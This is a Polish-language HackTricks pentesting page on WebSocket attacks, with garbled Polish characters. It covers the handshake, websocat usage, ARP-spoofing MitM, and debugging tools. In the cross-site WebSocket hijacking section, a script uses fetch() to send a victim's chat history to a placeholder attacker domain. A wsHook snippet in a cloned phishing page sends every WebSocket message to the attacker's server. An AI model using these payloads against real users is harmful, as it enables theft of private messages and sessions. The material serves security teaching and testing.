# Ataki WebSocket

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Czym s WebSockety

Poczenia WebSocket s nawizywane poprzez pocztkowe **HTTP** handshake i s zaprojektowane jako **dugoterminowe**, co pozwala na dwukierunkowe przesyanie wiadomoci w dowolnym momencie bez potrzeby systemu transakcyjnego. To sprawia, 偶e WebSockety s szczeg贸lnie korzystne dla aplikacji wymagajcych **niskiej latencji lub komunikacji inicjowanej przez serwer**, takich jak strumienie danych finansowych na 偶ywo.

### Nawizywanie pocze WebSocket

Szczeg贸owe wyjanienie nawizywania pocze WebSocket mo偶na znale藕 [**tutaj**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Podsumowujc, poczenia WebSocket s zazwyczaj inicjowane za pomoc JavaScript po stronie klienta, jak pokazano poni偶ej:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Protok贸 `wss` oznacza poczenie WebSocket zabezpieczone **TLS**, podczas gdy `ws` wskazuje na poczenie **niezabezpieczone**.

Podczas nawizywania poczenia wykonywane jest uzgadnianie midzy przegldark a serwerem za pomoc HTTP. Proces uzgadniania polega na tym, 偶e przegldarka wysya 偶danie, a serwer odpowiada, jak pokazano w poni偶szych przykadach:

Przegldarka wysya 偶danie uzgadniania:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Odpowied藕 serwera na handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Po nawizaniu poczenia pozostaje ono otwarte do wymiany wiadomoci w obu kierunkach.

**Kluczowe punkty handshake WebSocket:**

- Nag贸wki `Connection` i `Upgrade` sygnalizuj rozpoczcie handshake WebSocket.
- Nag贸wek `Sec-WebSocket-Version` wskazuje po偶dan wersj protokou WebSocket, zazwyczaj `13`.
- W nag贸wku `Sec-WebSocket-Key` wysyana jest losowa warto zakodowana w Base64, co zapewnia, 偶e ka偶dy handshake jest unikalny, co pomaga zapobiega problemom z proxy pamici podrcznej. Ta warto nie su偶y do uwierzytelniania, ale do potwierdzenia, 偶e odpowied藕 nie jest generowana przez 藕le skonfigurowany serwer lub pami podrczn.
- Nag贸wek `Sec-WebSocket-Accept` w odpowiedzi serwera jest hashem `Sec-WebSocket-Key`, weryfikujcym zamiar serwera do otwarcia poczenia WebSocket.

Te funkcje zapewniaj, 偶e proces handshake jest bezpieczny i niezawodny, torujc drog do efektywnej komunikacji w czasie rzeczywistym.


### Konsola Linux

Mo偶esz u偶y `websocat`, aby nawiza surowe poczenie z websocketem.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Lub aby utworzy serwer websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Jeli odkryjesz, 偶e klienci s poczeni z **HTTP websocket** z twojej bie偶cej lokalnej sieci, mo偶esz spr贸bowa [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing), aby przeprowadzi atak MitM midzy klientem a serwerem.\
Gdy klient pr贸buje si poczy, mo偶esz wtedy u偶y:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

Mo偶esz u偶y **narzdzia** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **do automatycznego odkrywania, identyfikacji i wyszukiwania znanych** **vulnerabilities** w websockets.

### Websocket Debug tools

* **Burp Suite** obsuguje komunikacj websockets w trybie MitM w bardzo podobny spos贸b, jak robi to dla standardowej komunikacji HTTP.
* Rozszerzenie [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite** pozwoli Ci lepiej zarzdza komunikacj Websocket w Burp, uzyskujc **histori**, ustawiajc **reguy przechwytywania**, u偶ywajc regu **match and replace**, korzystajc z **Intruder** i **AutoRepeater.**
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Skr贸t od "**WebSocket/Socket.io Proxy**", to narzdzie, napisane w Node.js, zapewnia interfejs u偶ytkownika do **przechwytywania, przechwytywania, wysyania niestandardowych** wiadomoci i przegldania wszystkich komunikacji WebSocket i Socket.IO midzy klientem a serwerem.
* [**wsrepl**](https://github.com/doyensec/wsrepl) to **interaktywny websocket REPL** zaprojektowany specjalnie do test贸w penetracyjnych. Zapewnia interfejs do obserwowania **przychodzcych wiadomoci websocket i wysyania nowych**, z atwym w u偶yciu frameworkiem do **automatyzacji** tej komunikacji.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) to **strona internetowa do komunikacji** z innymi stronami za pomoc **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) wr贸d innych typ贸w komunikacji/protok贸贸w, zapewnia **stron do komunikacji** z innymi stronami za pomoc **websockets.**

## Websocket Lab

W [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) masz kod do uruchomienia strony internetowej u偶ywajcej websockets, a w [**tym pocie**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) mo偶esz znale藕 wyjanienie.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, znane r贸wnie偶 jako **cross-origin WebSocket hijacking**, jest identyfikowane jako specyficzny przypadek **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** wpywajcy na handshake WebSocket. Ta luka wystpuje, gdy handshake WebSocket autoryzuje wycznie za pomoc **ciasteczek HTTP** bez **token贸w CSRF** lub podobnych rodk贸w bezpieczestwa.

Napastnicy mog to wykorzysta, hostujc **zoliw stron internetow**, kt贸ra inicjuje poczenie WebSocket midzy witrynami z podatn aplikacj. W konsekwencji to poczenie jest traktowane jako cz sesji ofiary z aplikacj, wykorzystujc brak ochrony CSRF w mechanizmie obsugi sesji.

### Simple Attack

Zauwa偶, 偶e podczas **nawizywania** poczenia **websocket** **ciasteczko** jest **wysyane** do serwera. **Serwer** mo偶e go u偶ywa do **powizania** ka偶dego **konkretnego** **u偶ytkownika** z jego **sesj websocket** na podstawie wysanego ciasteczka.

Jeli na przykad **serwer websocket** **wysya z powrotem histori rozmowy** u偶ytkownika, gdy wysyana jest wiadomo z "**READY"**, to **prosty XSS** nawizujcy poczenie (**ciasteczko** zostanie **wysane** **automatycznie** w celu autoryzacji u偶ytkownika ofiary) **wysyajc** "**READY**" bdzie w stanie **odzyska** histori **rozmowy**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

W tym wpisie na blogu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) atakujcy zdoa **wykona dowolny Javascript w subdomenie** domeny, w kt贸rej odbywaa si komunikacja przez web socket. Poniewa偶 bya to **subdomena**, **ciasteczko** byo **wysyane**, a poniewa偶 **Websocket nie sprawdza poprawnie Origin**, mo偶liwe byo komunikowanie si z nim i **kradzie偶 token贸w**.

### Stealing data from user

Skopiuj aplikacj webow, kt贸r chcesz naladowa (na przykad pliki .html) i wewntrz skryptu, w kt贸rym odbywa si komunikacja przez websocket, dodaj ten kod:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Teraz pobierz plik `wsHook.js` z [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i **zapisz go w folderze z plikami webowymi**.\
Ekspozycja aplikacji webowej i zmuszenie u偶ytkownika do poczenia si z ni pozwoli ci ukra wysyane i odbierane wiadomoci za pomoc websocket:
```javascript
sudo python3 -m http.server 80
```
## Warunki wycigu

Warunki wycigu w WebSocketach r贸wnie偶 istniej, [sprawd藕 te informacje, aby dowiedzie si wicej](race-condition.md#rc-in-websockets).

## Inne podatnoci

Poniewa偶 WebSockety s mechanizmem do **wysyania danych na stron serwera i klienta**, w zale偶noci od tego, jak serwer i klient obsuguj informacje, **WebSockety mog by u偶ywane do wykorzystywania kilku innych podatnoci, takich jak XSS, SQLi lub jakiejkolwiek innej powszechnej podatnoci webowej, wykorzystujc dane wejciowe u偶ytkownika z websocketu.**

## **Przemyt WebSocket贸w**

Ta podatno mo偶e pozwoli na **obejcie ogranicze odwrotnych proxy**, sprawiajc, 偶e uwierz, 偶e **komunikacja websocketowa zostaa nawizana** (nawet jeli to nieprawda). Mo偶e to pozwoli atakujcemu na **dostp do ukrytych punkt贸w kocowych**. Aby uzyska wicej informacji, sprawd藕 nastpujc stron:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Odniesienia

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
